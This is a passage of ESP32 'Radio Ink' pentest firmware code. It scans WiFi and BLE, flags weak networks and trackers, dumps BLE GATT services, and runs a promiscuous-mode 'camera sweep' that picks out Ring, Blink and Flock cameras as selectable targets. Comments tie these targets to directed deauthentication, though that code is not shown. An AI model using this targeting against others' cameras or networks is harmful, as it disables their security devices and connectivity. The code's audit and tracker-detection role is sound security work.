#if defined(RADIO_AUDIT_ENABLE_BLE)
  state = State::BLE_SCANNING;
  status = (String(deepScanMode ? "Deep BLE pass " : "Scanning BLE ") + scanCurrentPass + "/" + scanTotalPasses)
               .c_str();
  requestUpdateAndWait();
  if (!runBleScan(/*active=*/false, /*windows=*/1)) status = "BLE skipped (low memory)";
#endif
  finishScanPass();
}

#if defined(RADIO_AUDIT_ENABLE_BLE)
// Turn WiFi off, bring up the BLE controller (heap-floor guarded), and run
// `windows` bounded scan passes into bleFindings (clearing between to cap peak
// memory). Returns false if skipped for low heap. Shared by every BLE scan.
bool RadioAuditActivity::runBleScan(bool active, int windows) {
  WiFi.scanDelete();
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(200);

  const uint32_t freeHeap = ESP.getFreeHeap();
  LOG_DBG("RADIO", "BLE pre-scan heap %u", static_cast<unsigned>(freeHeap));
  if (freeHeap < BLE_HEAP_FLOOR_START) {
    LOG_ERR("RADIO", "BLE skipped: heap %u < %u", static_cast<unsigned>(freeHeap), BLE_HEAP_FLOOR_START);
    return false;
  }
  if (!bleReady) {
    BLEDevice::init("RadioInk");
    bleScan = BLEDevice::getScan();
    bleReady = true;
  }
  bleScan->setActiveScan(active);
  bleScan->setInterval(320);
  bleScan->setWindow(80);
  for (int w = 0; w < windows; w++) {
    if (ESP.getFreeHeap() < BLE_HEAP_FLOOR_ABORT) {
      LOG_ERR("RADIO", "BLE aborted at window %d: low heap", w);
      break;
    }
    absorbBleResults(bleScan->start(2, false), 96);
    bleScan->clearResults();
  }
  shutdownBleController();
  return true;
}

// Merge up to maxDevices from one scan window. The cap guards against a corrupt
// or pathologically large result set; our own storage is bounded separately.
void RadioAuditActivity::absorbBleResults(BLEScanResults* results, int maxDevices) {
  const int count = results ? results->getCount() : 0;
  for (int i = 0; i < count && i < maxDevices; i++) {
    BLEAdvertisedDevice device = results->getDevice(i);
    BleFinding finding;
    finding.address = device.getAddress().toString().c_str();
    finding.name = device.haveName() ? device.getName().c_str() : "";
    finding.rssi = device.getRSSI();
    finding.rssiMin = finding.rssi;
    finding.rssiMax = finding.rssi;
    finding.rssiSum = finding.rssi;
    finding.seenCount = 1;
    finding.hasTxPower = device.haveTXPower();
    finding.txPower = finding.hasTxPower ? device.getTXPower() : 0;
    finding.manufacturerHex = device.haveManufacturerData() ? hexEncode(device.getManufacturerData()).c_str() : "";
    if (device.haveServiceData()) {
      finding.serviceDataUuid = device.getServiceDataUUID().toString().c_str();
      finding.serviceDataHex = hexEncode(device.getServiceData()).c_str();
    }
    mergeBleFinding(std::move(finding));
  }
}
#endif

void RadioAuditActivity::shutdownBleController() {
#if defined(RADIO_AUDIT_ENABLE_BLE)
  if (bleScan) {
    bleScan->stop();
    bleScan->clearResults();
  }
  if (bleReady) {
    // Do not pass true here. Releasing controller memory can make the next
    // BLE init unsafe without reboot, which breaks Deep Scan pass 2.
    BLEDevice::deinit(false);
  }
  bleScan = nullptr;
  bleReady = false;
  delay(500);
#endif
}

void RadioAuditActivity::resetWifiForScan() {
  WiFi.scanDelete();
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(250);
}

void RadioAuditActivity::finishScanPass() {
  std::sort(wifiFindings.begin(), wifiFindings.end(),
            [](const WifiFinding& a, const WifiFinding& b) { return a.rssi > b.rssi; });
  std::sort(bleFindings.begin(), bleFindings.end(),
            [](const BleFinding& a, const BleFinding& b) { return a.rssi > b.rssi; });

  if (scanCurrentPass < scanTotalPasses) {
    scanCurrentPass++;
    beginScanPass();
    return;
  }

  rebuildAuditFindings();
  scanTime = timeStamp();
  state = State::DONE;
  status = (String(deepScanMode ? "Deep scan complete, " : "Scan complete, ") + auditFindings.size() + " findings")
               .c_str();
  requestUpdate();
}

void RadioAuditActivity::mergeWifiFinding(WifiFinding&& finding) {
  for (auto& existing : wifiFindings) {
    if (existing.bssid == finding.bssid) {
      existing.rssi = averageRssi(existing.rssiSum + finding.rssi, existing.seenCount + 1);
      existing.rssiMin = std::min(existing.rssiMin, finding.rssi);
      existing.rssiMax = std::max(existing.rssiMax, finding.rssi);
      existing.rssiSum += finding.rssi;
      existing.seenCount++;
      if (existing.ssid.empty() && !finding.ssid.empty()) existing.ssid = finding.ssid;
      existing.auth = finding.auth;
      existing.channel = finding.channel;
      existing.hidden = existing.hidden && finding.hidden;
      return;
    }
  }

  if (wifiFindings.size() < MAX_WIFI_FINDINGS) {
    wifiFindings.push_back(std::move(finding));
    return;
  }

  auto weakest = std::min_element(wifiFindings.begin(), wifiFindings.end(),
                                  [](const WifiFinding& a, const WifiFinding& b) { return a.rssi < b.rssi; });
  if (weakest != wifiFindings.end() && finding.rssi > weakest->rssi) {
    *weakest = std::move(finding);
  }
}

void RadioAuditActivity::mergeBleFinding(BleFinding&& finding) {
  for (auto& existing : bleFindings) {
    if (existing.address == finding.address) {
      existing.rssi = averageRssi(existing.rssiSum + finding.rssi, existing.seenCount + 1);
      existing.rssiMin = std::min(existing.rssiMin, finding.rssi);
      existing.rssiMax = std::max(existing.rssiMax, finding.rssi);
      existing.rssiSum += finding.rssi;
      existing.seenCount++;
      if (existing.name.empty() && !finding.name.empty()) existing.name = finding.name;
      if (existing.manufacturerHex.empty() && !finding.manufacturerHex.empty()) {
        existing.manufacturerHex = finding.manufacturerHex;
      }
      if (existing.serviceDataHex.empty() && !finding.serviceDataHex.empty()) {
        existing.serviceDataUuid = finding.serviceDataUuid;
        existing.serviceDataHex = finding.serviceDataHex;
      }
      if (finding.hasTxPower) {
        existing.hasTxPower = true;
        existing.txPower = finding.txPower;
      }
      return;
    }
  }

  if (bleFindings.size() < MAX_BLE_FINDINGS) {
    bleFindings.push_back(std::move(finding));
    return;
  }

  auto weakest = std::min_element(bleFindings.begin(), bleFindings.end(),
                                  [](const BleFinding& a, const BleFinding& b) { return a.rssi < b.rssi; });
  if (weakest != bleFindings.end() && finding.rssi > weakest->rssi) {
    *weakest = std::move(finding);
  }
}

void RadioAuditActivity::exportText() {
  const String report = makeTextReport();
  const bool ok = saveFile(TEXT_EXPORT_PATH, report) && saveFile(makeTimestampedPath("txt").c_str(), report);
  state = State::SAVED;
  status = ok ? "Saved text report" : "Save failed";
  requestUpdate();
}

void RadioAuditActivity::exportCsv() {
  const String report = makeCsvReport();
  const bool ok = saveFile(CSV_EXPORT_PATH, report) && saveFile(makeTimestampedPath("csv").c_str(), report);
  state = State::SAVED;
  status = ok ? "Saved CSV report" : "Save failed";
  requestUpdate();
}

void RadioAuditActivity::exportJson() {
  const String report = makeJsonReport();
  const bool ok = saveFile(JSON_EXPORT_PATH, report) && saveFile(makeTimestampedPath("json").c_str(), report);
  state = State::SAVED;
  status = ok ? "Saved JSON report" : "Save failed";
  requestUpdate();
}

void RadioAuditActivity::exportWigle() {
  const String report = makeWigleReport();
  const bool ok =
      saveFile(WIGLE_EXPORT_PATH, report) && saveFile(makeTimestampedPath("wigle.csv").c_str(), report);
  state = State::SAVED;
  status = ok ? "Saved WiGLE CSV" : "Save failed";
  requestUpdate();
}

bool RadioAuditActivity::saveFile(const char* path, const String& content) {
  Storage.ensureDirectoryExists(AUDIT_DIR);
  if (!Storage.writeFile(path, content)) {
    LOG_ERR("RADIO", "Failed to save %s", path);
    state = State::ERROR;
    status = "Save failed";
    return false;
  }
  return true;
}

String RadioAuditActivity::makeTimestampedPath(const char* ext) const {
  return String(AUDIT_DIR) + "/scan-" + String(millis() / 1000) + "." + ext;
}

void RadioAuditActivity::addAuditFinding(const char* severity, const std::string& title, const std::string& detail,
                                         int wifiIndex, int bleIndex) {
  AuditFinding finding;
  finding.severity = severity;
  finding.title = title;
  finding.detail = detail;
  finding.wifiIndex = wifiIndex;
  finding.bleIndex = bleIndex;
  auditFindings.push_back(std::move(finding));
}

void RadioAuditActivity::rebuildAuditFindings() {
  auditFindings.clear();
  loadWatchlist();

  auto addFinding = [this](const char* severity, const std::string& title, const std::string& detail,
                           int wifiIndex = -1, int bleIndex = -1) {
    addAuditFinding(severity, title, detail, wifiIndex, bleIndex);
  };
  auto onWatchlist = [this](const std::string& mac) {
    const std::string up = upperStr(mac);
    for (const auto& entry : watchlist)
      if (!entry.empty() && up.find(entry) != std::string::npos) return true;
    return false;
  };

  int channelCounts[15] = {};
  for (size_t wi = 0; wi < wifiFindings.size(); wi++) {
    const auto& w = wifiFindings[wi];
    if (w.channel >= 1 && w.channel <= 14) channelCounts[w.channel]++;
    if (onWatchlist(w.bssid))
      addFinding("HIGH", "Watchlist hit",
                 (w.ssid.empty() ? w.bssid : w.ssid) + " (" + w.bssid + ") is on your watchlist.", wi);

    const std::string ssid = w.ssid.empty() ? std::string("<hidden>") : w.ssid;
    const std::string base = ssid + " " + w.bssid + " avg " + std::to_string(w.rssi) + " dBm CH" +
                             std::to_string(w.channel) + " seen " + std::to_string(w.seenCount) + "/" +
                             std::to_string(scanTotalPasses);
    if (w.auth == "OPEN") {
      addFinding("HIGH", "Open WiFi network", base + " has no encryption.", wi);
    } else if (w.auth == "WEP") {
      addFinding("HIGH", "WEP WiFi network", base + " uses broken legacy encryption.", wi);
    } else if (w.auth == "WPA") {
      addFinding("MED", "Legacy WPA network", base + " is not WPA2/WPA3.", wi);
    }

    if (w.hidden) {
      addFinding("LOW", "Hidden SSID observed", w.bssid + " is hiding its SSID but still appears in scans.", wi);
    }

    const std::string wifiVendor = macVendor(w.bssid);
    // SSID/vendor fingerprint first; fall back to the MAC OUI so cameras with a
    // hidden/renamed SSID (notably Flock Safety) still surface.
    std::string cameraReason = cameraFingerprintReason(ssid, wifiVendor);
    if (cameraReason.empty()) cameraReason = cameraMacReason(w.bssid);
    if (!cameraReason.empty()) {
      const bool flock = cameraReason.find("Flock") != std::string::npos;
      addFinding(flock ? "HIGH" : "MED", flock ? "Flock Safety camera" : "Possible security camera",
                 base + " matches camera sweep: " + cameraReason +
                     (wifiVendor.empty() ? "." : (" (" + wifiVendor + ").")),
                 wi);
    }

    if (deepScanMode && w.seenCount < scanTotalPasses) {
      addFinding("INFO", "Intermittent WiFi AP", base + " was not visible in every scan pass.", wi);
    }
  }

  for (size_t i = 0; i < wifiFindings.size(); i++) {
    if (wifiFindings[i].ssid.empty()) continue;
    bool alreadyReported = false;
    for (size_t previous = 0; previous < i; previous++) {
      if (wifiFindings[previous].ssid == wifiFindings[i].ssid) {
        alreadyReported = true;
        break;
      }
    }
    if (alreadyReported) continue;
    int sameSsidCount = 1;
    for (size_t j = i + 1; j < wifiFindings.size(); j++) {
      if (wifiFindings[j].ssid == wifiFindings[i].ssid) sameSsidCount++;
    }
    if (sameSsidCount > 1) {
      addFinding("INFO", "Duplicate SSID", wifiFindings[i].ssid + " appears on " + std::to_string(sameSsidCount) +
                                             " BSSIDs.");
    }
  }

  for (int channel = 1; channel <= 14; channel++) {
    if (channelCounts[channel] >= 4) {
      addFinding("INFO", "Crowded WiFi channel",
                 "Channel " + std::to_string(channel) + " has " + std::to_string(channelCounts[channel]) +
                     " visible APs.");
    }
  }

  for (size_t bi = 0; bi < bleFindings.size(); bi++) {
    const auto& b = bleFindings[bi];
    const std::string label = b.name.empty() ? b.address : b.name + " " + b.address;
    const std::string advType = decodeBleAdvert(b.manufacturerHex, b.serviceDataUuid, b.serviceDataHex);
    const std::string cameraReason = cameraFingerprintReason(label + " " + advType, bleCompany(b.manufacturerHex));
    if (onWatchlist(b.address))
      addFinding("HIGH", "Watchlist hit", label + " is on your watchlist.", -1, bi);
    if (!cameraReason.empty()) {
      addFinding("MED", "Possible security camera",
                 label + " matches camera sweep: " + cameraReason + ".", -1, bi);
    }
    if (b.rssi >= -55) {
      addFinding("MED", "Close BLE device",
                 label + " is nearby at avg " + std::to_string(b.rssi) + " dBm, seen " +
                     std::to_string(b.seenCount) + "/" + std::to_string(scanTotalPasses) + ".",
                 -1, bi);
    }
    if (advType.find("FindMy") != std::string::npos || advType.find("AirTag") != std::string::npos) {
      addFinding("MED", "Possible tracker", label + " advertises " + advType + " (AirTag/FindMy).", -1, bi);
    } else if (!advType.empty()) {
      addFinding("INFO", "BLE device identified", label + " looks like: " + advType + ".", -1, bi);
    } else if (!b.manufacturerHex.empty()) {
      addFinding("INFO", "BLE manufacturer data", label + " advertises manufacturer data.", -1, bi);
    }
    if (deepScanMode && b.seenCount < scanTotalPasses) {
      addFinding("INFO", "Intermittent BLE device", label + " was not visible in every scan pass.", -1, bi);
    }
  }

  // Compare against the previous scan and persist this one (adds NEW/GONE findings).
  // Only for full (Wi-Fi + BLE) scans; a single-radio scan would falsely flag the
  // other radio's devices as "gone".
  if (scanScope == ScanScope::Both) diffAndSaveSnapshot();

  if (auditFindings.empty() && (!wifiFindings.empty() || !bleFindings.empty())) {
    addFinding("INFO", "No obvious findings", "Scan completed without open, weak, close, or crowded indicators.");
  }
}

void RadioAuditActivity::showAuditFindings() {
  if (auditFindings.empty()) {
    status = "No audit findings";
    requestUpdate();
    return;
  }
  showingFindings = true;
  showingDetails = false;
  selectedFinding = 0;
  requestUpdate();
}

void RadioAuditActivity::showWifiDetails() {
  if (wifiFindings.empty()) {
    status = "No WiFi results";
    requestUpdate();
    return;
  }
  showingDetails = true;
  showingFindings = false;
  showingBleDetails = false;
  selectedFinding = 0;
  requestUpdate();
}

void RadioAuditActivity::showBleDetails() {
  if (bleFindings.empty()) {
    status = "No BLE results";
    requestUpdate();
    return;
  }
  showingDetails = true;
  showingFindings = false;
  showingBleDetails = true;
  selectedFinding = 0;
  requestUpdate();
}

void RadioAuditActivity::startCameraSweep() {
  // Self-contained blocking sweep so we can do three passes a normal scan can't:
  //  1) WiFi AP scan (SSID/vendor clues)
  //  2) associated client-station capture (Ring/Blink join as STAs, not APs)
  //  3) ACTIVE BLE scan (scan responses carry device names)
  wifiFindings.clear();
  bleFindings.clear();
  clientFindings.clear();
  scanTotalPasses = 1;
  scanCurrentPass = 1;
  deepScanMode = false;
  state = State::WIFI_SCANNING;
  status = "Camera sweep: WiFi APs...";
  requestUpdateAndWait();

  // 1) WiFi AP scan (blocking).
  prepWifiSta();
  const int n = WiFi.scanNetworks(false, true);
  for (int i = 0; i < n; i++) {
    WifiFinding f;
    f.ssid = WiFi.SSID(i).c_str();
    f.bssid = WiFi.BSSIDstr(i).c_str();
    f.rssi = WiFi.RSSI(i);
    f.rssiMin = f.rssiMax = f.rssiSum = f.rssi;
    f.channel = WiFi.channel(i);
    f.seenCount = 1;
    f.auth = authName(WiFi.encryptionType(i));
    f.hidden = f.ssid.empty();
    mergeWifiFinding(std::move(f));
  }
  WiFi.scanDelete();

  // 2) Associated client stations (channel-hopping promiscuous data capture).
  status = "Camera sweep: clients...";
  requestUpdateAndWait();
  g_clientCap = makeUniqueNoThrow<ClientCapture>();
  if (g_clientCap) {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&clientPromiscuousCb);
    wifi_promiscuous_filter_t filter = {};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    g_clientCap->active = true;

    // Camera clients live on the channel of an AP we already found, so dwell on
    // those channels for a real window instead of fast-hopping all 13 (the old
    // 300ms/ch hop caught almost nothing -- ~13 frames total). Fall back to a
    // full hop only if we somehow found no APs.
    bool chSeen[14] = {};
    uint8_t apChannels[14];
    int apChCount = 0;
    for (const auto& w : wifiFindings) {
      if (w.channel >= 1 && w.channel <= 13 && !chSeen[w.channel]) {
        chSeen[w.channel] = true;
        apChannels[apChCount++] = static_cast<uint8_t>(w.channel);
      }
    }
    if (apChCount > 0) {
      for (int round = 0; round < 2; round++) {
        for (int i = 0; i < apChCount; i++) {
          esp_wifi_set_channel(apChannels[i], WIFI_SECOND_CHAN_NONE);
          status = "Camera sweep: clients CH" + std::to_string(apChannels[i]) + "...";
          requestUpdate();
          delay(1500);  // dwell long enough to catch periodic camera traffic
        }
      }
    } else {
      for (int ch = 1; ch <= 13; ch++) {
        esp_wifi_set_channel(static_cast<uint8_t>(ch), WIFI_SECOND_CHAN_NONE);
        delay(500);
      }
    }
    g_clientCap->active = false;
    esp_wifi_set_promiscuous(false);
    const int clients = g_clientCap->count;
    LOG_INF("CAM", "sweep: %d APs, %u data frames, %d stations", static_cast<int>(wifiFindings.size()),
            static_cast<unsigned>(g_clientCap->framesSeen), clients);
    clientFindings.reserve(clients);
    for (int i = 0; i < clients; i++) {
      ProbeEntry e;
      e.client = macToString(g_clientCap->rows[i].mac);
      e.apBssid = macToString(g_clientCap->rows[i].bssid);
      e.rssi = g_clientCap->rows[i].rssi;
      e.channel = g_clientCap->rows[i].channel;
      const std::string cam = cameraMacReason(e.client);
      LOG_INF("CAM", "  STA %s %ddBm vendor='%s' ap=%s%s", e.client.c_str(), e.rssi, macVendor(e.client).c_str(),
              e.apBssid.c_str(), cam.empty() ? "" : (" CAMERA:" + cam).c_str());
      clientFindings.push_back(std::move(e));
    }
    g_clientCap.reset();  // free the client table back to the heap
  }
  WiFi.mode(WIFI_OFF);
  delay(150);

  // 3) Active BLE scan (names live in scan responses, which passive misses).
#if defined(RADIO_AUDIT_ENABLE_BLE)
  state = State::BLE_SCANNING;
  status = "Camera sweep: BLE...";
  requestUpdateAndWait();
  runBleScan(/*active=*/true, /*windows=*/3);
#endif

  std::sort(wifiFindings.begin(), wifiFindings.end(),
            [](const WifiFinding& a, const WifiFinding& b) { return a.rssi > b.rssi; });
  std::sort(bleFindings.begin(), bleFindings.end(),
            [](const BleFinding& a, const BleFinding& b) { return a.rssi > b.rssi; });
  scanTime = timeStamp();
  state = State::DONE;
  showCameraSweep();
}

// Collect every camera-like hit (AP / associated client / BLE) into the
// selectable cameraTargets list. Clients carry the AP they're on for deauth.
void RadioAuditActivity::buildCameraTargets() {
  cameraTargets.clear();
  cameraSel = 0;

  for (const auto& w : wifiFindings) {
    const std::string label = w.ssid.empty() ? std::string("<hidden>") : w.ssid;
    const std::string vendor = macVendor(w.bssid);
    std::string reason = cameraFingerprintReason(label, vendor);
    if (reason.empty()) reason = cameraMacReason(w.bssid);
    if (reason.empty()) reason = cameraVendorReason(vendor);
    if (reason.empty()) continue;
    CameraTarget t;
    t.kind = CameraTarget::Kind::WifiAp;
    t.mac = w.bssid;
    t.label = label;
    t.reason = reason;
    parseBssid(w.bssid, t.macBytes);
    t.channel = w.channel;
    t.rssi = w.rssi;
    cameraTargets.push_back(std::move(t));
  }

  for (const auto& c : clientFindings) {
    const std::string vendor = macVendor(c.client);
    std::string reason = cameraMacReason(c.client);
    if (reason.empty()) reason = cameraVendorReason(vendor);
    // A privacy-randomized MAC has no vendor to match, but a randomized client is
    // a valid camera candidate (modern Ring/Blink rotate MACs) -- surface it
    // instead of silently dropping it.
    if (reason.empty() && vendor == "randomized") reason = "Randomized MAC (possible camera)";
    if (reason.empty()) continue;
    CameraTarget t;
    t.kind = CameraTarget::Kind::Client;
    t.mac = c.client;
    t.label = vendor.empty() ? std::string("client") : vendor;
    t.reason = reason;
    parseBssid(c.client, t.macBytes);
    if (!c.apBssid.empty() && parseBssid(c.apBssid, t.apBytes)) t.hasAp = true;
    // Prefer the channel we actually heard the client on; fall back to its AP's.
    t.channel = (c.channel >= 1 && c.channel <= 14) ? c.channel : 0;
    if (t.channel == 0)
      for (const auto& w : wifiFindings)
        if (w.bssid == c.apBssid) {
          t.channel = w.channel;
          break;
        }
    t.rssi = c.rssi;
    cameraTargets.push_back(std::move(t));
  }

  for (const auto& b : bleFindings) {
    const std::string label = b.name.empty() ? std::string("<unnamed>") : b.name;
    const std::string advType = decodeBleAdvert(b.manufacturerHex, b.serviceDataUuid, b.serviceDataHex);
    const std::string vendor = bleCompany(b.manufacturerHex);
    std::string reason = cameraFingerprintReason(label + " " + advType, vendor);
    if (reason.empty()) reason = cameraVendorReason(vendor);
    if (reason.empty()) continue;
    CameraTarget t;
    t.kind = CameraTarget::Kind::Ble;
    t.mac = b.address;
    t.label = label;
    t.reason = reason;
    t.rssi = b.rssi;
    cameraTargets.push_back(std::move(t));
  }

  // Rank: confident vendor/OUI hits first, low-confidence "Randomized MAC"
  // candidates last; stronger signal first within each tier.
  auto confident = [](const CameraTarget& t) { return t.reason.find("Randomized") == std::string::npos; };
  std::sort(cameraTargets.begin(), cameraTargets.end(), [&](const CameraTarget& a, const CameraTarget& b) {
    if (confident(a) != confident(b)) return confident(a);
    return a.rssi > b.rssi;
  });
}

void RadioAuditActivity::showCameraSweep() {
  buildCameraTargets();

  if (!cameraTargets.empty()) {
    status = std::to_string(cameraTargets.size()) + " camera(s) - select to act";
    cameraSel = 0;
    showingCameraList = true;
    showingTarget = false;
    showingDetails = false;
    showingFindings = false;
    requestUpdate();
    return;
  }

  // No camera hits: informative text view.
  targetTitle = "Camera Sweep";
  targetLines.clear();
  targetScroll = 0;
  targetFromList = false;
  targetFromCameraList = false;
  targetLocatable = false;
  targetIsCamera = false;
  targetLines.push_back("WiFi APs " + std::to_string(wifiFindings.size()) + "  clients " +
                        std::to_string(clientFindings.size()) + "  BLE " + std::to_string(bleFindings.size()));
  targetLines.push_back("No camera-like RF fingerprints found.");
  targetLines.push_back("5GHz-only cams are invisible to this");
  targetLines.push_back("2.4GHz radio. Keep the camera live");
  targetLines.push_back("(motion/stream) during the sweep.");
  status = "Camera sweep: 0 hits";
  showingCameraList = false;
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::renderCameraList() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  const auto pageHeight = renderer.getScreenHeight();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "Cameras", status.c_str());
  const int n = static_cast<int>(cameraTargets.size());
  const int listHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;
  GUI.drawList(
      renderer, Rect{0, contentTop, pageWidth, listHeight}, n, cameraSel,
      [this](int i) {
        const CameraTarget& t = cameraTargets[i];
        const char* k = t.kind == CameraTarget::Kind::WifiAp ? "AP"
                        : t.kind == CameraTarget::Kind::Ble  ? "BLE"
                                                             : "STA";
        return std::string("[") + k + "] " + t.label + "  " + std::to_string(t.rssi) + "dBm";
      },
      nullptr, nullptr);
  const auto labels = mappedInput.mapLabels("Back", "Select", "Up", "Down");
  UITheme::getInstance().suppressBrandLogoOnce();
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

void RadioAuditActivity::openCameraDetail(int idx) {
  if (idx < 0 || idx >= static_cast<int>(cameraTargets.size())) return;
  const CameraTarget& t = cameraTargets[idx];

  targetTitle = "Camera";
  targetLines.clear();
  targetScroll = 0;
  const char* kindStr = t.kind == CameraTarget::Kind::WifiAp ? "WiFi AP"
                        : t.kind == CameraTarget::Kind::Ble  ? "BLE"
                                                             : "WiFi client";
  targetLines.push_back(t.label);
  targetLines.push_back(std::string(kindStr) + "  " + t.mac);
  targetLines.push_back(std::to_string(t.rssi) + " dBm" + (t.channel ? "  CH" + std::to_string(t.channel) : ""));
  targetLines.push_back(t.reason);
  if (t.kind == CameraTarget::Kind::Client) {
    if (t.hasAp)
      targetLines.push_back("on AP " + macToString(t.apBytes));
    else
      targetLines.push_back("AP unknown (deauth needs it)");
  }

  // Locator + directed-deauth target state.
  targetIsCamera = true;
  targetLocatable = true;  // all kinds can be located (WiFi by MAC, BLE by address)
  targetCamChannel = t.channel;
  targetCamHasAp = t.hasAp;
  memcpy(targetCamMac, t.macBytes, 6);
  memcpy(targetCamAp, t.apBytes, 6);

  if (t.kind == CameraTarget::Kind::Ble) {
    targetLocBle = true;
    targetLocAddr = t.mac;
  } else {
    targetLocBle = false;
    memcpy(targetLocBssid, t.macBytes, 6);  // locate by this device's MAC (matches any addr field)
    targetLocChannel = (t.channel >= 1 && t.channel <= 13) ? t.channel : 1;
  }

  targetFromList = false;
  targetFromCameraList = true;
  targetMenuOpen = false;
  showingTarget = true;
  showingCameraList = false;
  showingDetails = false;
  requestUpdate();
}

void RadioAuditActivity::showAbout() {
  targetTitle = "About Radio Ink";
  targetLines.clear();
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  targetLines.push_back("Radio Ink");
  targetLines.push_back("Version: " RADIOINK_VERSION);
  targetLines.push_back("");
  targetLines.push_back("Created by dag nazty");
  targetLines.push_back("https://dagnazty.dev");
  targetLines.push_back("");
  targetLines.push_back("RF audit / pentest firmware");
  targetLines.push_back("for the Xteink X-series (ESP32-C3).");
  targetLines.push_back("Authorized testing only.");
  status = "About";
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::startTrackerSweep() {
  bleFindings.clear();
  scanTotalPasses = 1;
  scanCurrentPass = 1;
  deepScanMode = false;
  state = State::BLE_SCANNING;
  status = "Tracker sweep: BLE...";
  requestUpdateAndWait();

#if defined(RADIO_AUDIT_ENABLE_BLE)
  runBleScan(/*active=*/true, /*windows=*/3);
#endif

  std::sort(bleFindings.begin(), bleFindings.end(),
            [](const BleFinding& a, const BleFinding& b) { return a.rssi > b.rssi; });
  scanTime = timeStamp();
  state = State::DONE;

  targetTitle = "Tracker Sweep";
  targetLines.clear();
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  int hits = 0;
  targetLines.push_back("BLE devices " + std::to_string(bleFindings.size()));
  for (const auto& b : bleFindings) {
    const std::string reason = trackerReason(b.manufacturerHex, b.serviceDataUuid, b.serviceDataHex, b.name);
    if (reason.empty()) continue;
    hits++;
    targetLines.push_back(reason);
    targetLines.push_back("  " + (b.name.empty() ? b.address : b.name) + "  " + std::to_string(b.rssi) + " dBm");
    if (!b.name.empty()) targetLines.push_back("  " + b.address);
  }
  if (hits == 0) {
    targetLines.push_back("No known trackers detected.");
    targetLines.push_back("Note: AirTags rotate their MAC and");
    targetLines.push_back("only beacon FindMy when separated");
    targetLines.push_back("from their owner.");
  }
  status = std::string("Trackers: ") + std::to_string(hits);
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

#if defined(RADIO_AUDIT_ENABLE_BLE)
void RadioAuditActivity::gattEnumerate() {
  targetMenuOpen = false;
  status = "GATT: connecting...";
  requestUpdateAndWait();

  std::vector<std::string> lines;
  lines.reserve(32);
  lines.push_back("GATT: " + targetLocAddr);

  if (ESP.getFreeHeap() < BLE_HEAP_FLOOR_START) {
    lines.push_back("Low memory - cannot connect.");
  } else {
    if (!bleReady) {
      BLEDevice::init("RadioInk");
      bleReady = true;
    }
    BLEClient* client = BLEDevice::createClient();
    if (!client) {
      lines.push_back("createClient failed.");
    } else if (!client->connect(BLEAddress(String(targetLocAddr.c_str())))) {
      lines.push_back("Connect failed (not connectable");
      lines.push_back("or out of range).");
    } else {
      std::map<std::string, BLERemoteService*>* services = client->getServices();
      lines.push_back(std::string("Services: ") + std::to_string(services ? services->size() : 0));
      if (services) {
        for (auto& s : *services) {
          BLERemoteService* svc = s.second;
          lines.push_back(std::string("SVC ") + svc->getUUID().toString().c_str());
          std::map<std::string, BLERemoteCharacteristic*>* chars = svc->getCharacteristics();
          if (chars) {
            for (auto& c : *chars) {
              BLERemoteCharacteristic* ch = c.second;
              std::string props;
              if (ch->canRead()) props += "R";
              if (ch->canWrite()) props += "W";
              if (ch->canNotify()) props += "N";
              if (ch->canIndicate()) props += "I";
              lines.push_back(std::string("  CH ") + ch->getUUID().toString().c_str() + " [" + props + "]");
            }
          }
        }
      }
      client->disconnect();
    }
    // Note: not deleting the client (BLEDevice owns peer state; deinit cleans up).
  }
  shutdownBleController();
  WiFi.mode(WIFI_OFF);
  delay(50);

  targetTitle = "GATT dump";
  targetLines = std::move(lines);
  targetScroll = 0;
  targetLocatable = false;
  status = "GATT done";
  showingTarget = true;
  requestUpdate();
}
#endif

void RadioAuditActivity::deepScanWifiTarget(int index) {
  if (index < 0 || index >= static_cast<int>(wifiFindings.size())) return;
  lastDeepScanWifiIndex = index;  // remembered so the detail view can deauth this AP
  targetMenuOpen = false;
  const WifiFinding w = wifiFindings[index];  // copy: vector is rebuilt by scans
  targetTitle = std::string("AP ") + (w.ssid.empty() ? std::string("<hidden>") : w.ssid);
  targetLines.clear();
  targetScroll = 0;
  targetFromList = true;

  uint8_t bssid[6];
  if (!parseBssid(w.bssid, bssid)) {
    targetLines.push_back("Bad BSSID: " + w.bssid);
    status = "Deep scan failed";
    showingTarget = true;
    showingDetails = false;
    requestUpdate();
    return;
  }

  status = "Deep scanning AP...";
  requestUpdateAndWait();

  // Sniff this AP's channel in promiscuous mode for clients + posture.
  prepWifiSta();

  memset(&g_targetCap, 0, sizeof(g_targetCap));
  memcpy(g_targetCap.bssid, bssid, 6);

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&targetPromiscuousCb);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(static_cast<uint8_t>(w.channel), WIFI_SECOND_CHAN_NONE);

  g_targetCap.active = true;
  delay(TARGET_WIFI_DEEP_MS);
  g_targetCap.active = false;
  esp_wifi_set_promiscuous(false);

  const int samples = g_targetCap.rssiSamples;
  const int avg = samples ? static_cast<int>(g_targetCap.rssiSum / static_cast<long>(samples)) : w.rssi;
  const int lo = samples ? g_targetCap.rssiMin : w.rssi;
  const int hi = samples ? g_targetCap.rssiMax : w.rssi;

